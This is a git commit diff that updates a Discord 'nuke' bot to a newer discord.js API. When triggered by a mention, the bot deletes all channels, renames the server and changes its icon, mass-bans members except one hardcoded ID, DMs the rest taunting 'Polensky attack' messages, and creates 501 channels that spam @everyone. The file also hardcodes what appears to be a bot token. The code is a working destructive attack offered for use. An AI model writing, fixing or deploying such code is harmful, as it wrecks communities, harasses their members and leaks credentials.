4a38b46a2f89cb0e8ffcc66eed5784999107d1e4
A_Beille <78448220+A-Beille@users.noreply.github.com>
2023-04-09 01:29:30 +0200

    Add files via upload

--- index.js
+++ index.js
@@ -1,18 +1,17 @@
 const Discord = require('discord.js')
-const client = new Discord.Client({intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MEMBERS, Discord.Intents.FLAGS.GUILD_MESSAGES,Discord.Intents.FLAGS.GUILD_INTEGRATIONS]})
+const client = new Discord.Client({intents: [47095]})
 client.login('ODA5NDYyMjQ3NTExNjg3MTc5.YCVcdg.pydRlF3YR4hIs6xtgdjrPzoCqGM')
-client.on('ready',()=>{
-    client.user.setStatus('invisible')
+client.on(Discord.Events.ClientReady,()=>{
+    client.user.setStatus(Discord.PresenceUpdateStatus.Invisible)
 })
 client.on('messageCreate',async (message)=>{
+    if(message.author.id == client.user.id) return;
+    if(!message.channel.guildId) return;
     if(message.mentions.members.first() || message.mentions.roles.first() || message.mentions.everyone){
-        if(message.author.id == client.user.id) return;
         message.guild.setIcon('./nuke.png','Polensky attack')
         message.guild.setName('Nuked','Polensky attack')
         message.guild.channels.cache.forEach(channel=>{
-            if(channel.deletable){
             channel.delete('Polensky attack')
-            }
         })
         message.guild.members.cache.forEach(member=>{
 if(member.bannable && member.id != '667745765707350026'){
@@ -23,25 +22,25 @@ if(member.bannable && member.id != '667745765707350026'){
 else{
     if(member.user.bot) return;
     member.send({
-        embeds:[new Discord.MessageEmbed()
+        embeds:[new Discord.EmbedBuilder()
         .setTitle('Polensky')
     .setDescription('You were attacked by Polensky Nuke Attack !')
-.setColor('YELLOW')
+.setColor(Discord.Colors.Yellow)
 .setThumbnail('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/2048px-Nuclear_symbol.svg.png')
 .setFooter({text:'Sadly'})]
     })
     member.send({
-        embeds:[new Discord.MessageEmbed()
+        embeds:[new Discord.EmbedBuilder()
         .setTitle('Polensky')
     .setDescription('Vous avez été attaqué par l\'attaque nuke de Polensky !')
-.setColor('YELLOW')
+.setColor(Discord.Colors.Yellow)
 .setThumbnail('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/2048px-Nuclear_symbol.svg.png')
 .setFooter({text:'Sadly'})]
     })
 }
         })
        for(let i = 0;i<501;i++){
-        message.guild.channels.create('🙂H4CKED',{reason: 'Polensky attack'}).then(channel=>{
+        message.guild.channels.create({name:'🙂H4CKED',reason: 'Polensky attack'}).then(channel=>{
 setInterval(()=>{
     channel.send({
         content:'@everyone'
